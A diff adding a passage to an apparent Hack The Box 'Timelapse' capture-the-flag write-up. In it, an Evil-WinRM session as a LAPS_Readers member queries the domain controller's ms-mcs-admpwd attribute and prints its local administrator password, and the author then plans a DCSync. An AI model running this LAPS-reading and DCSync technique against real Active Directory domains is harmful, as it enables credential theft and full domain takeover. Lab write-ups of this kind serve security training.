@@ -370,5 +370,26 @@ Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
 It looks like im part of an interesting group, `LAPS_Readers`
 
 ```python
+*Evil-WinRM* PS C:\Users\svc_deploy> Get-ADComputer DC01 -property 'ms-mcs-admpwd'
+
+
+DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
+DNSHostName       : dc01.timelapse.htb
+Enabled           : True
+ms-mcs-admpwd     : mL.Fe-Iu!iIm[}h(&)/LT650
+Name              : DC01
+ObjectClass       : computer
+ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
+SamAccountName    : DC01$
+SID               : S-1-5-21-671920749-559770252-3318990721-1000
+UserPrincipalName :
+
+
+
+*Evil-WinRM* PS C:\Users\svc_deploy> 
+```
+Now i have the password for the machine account `dc01` which means i can do a DCSync
+
+```python
 
 ```
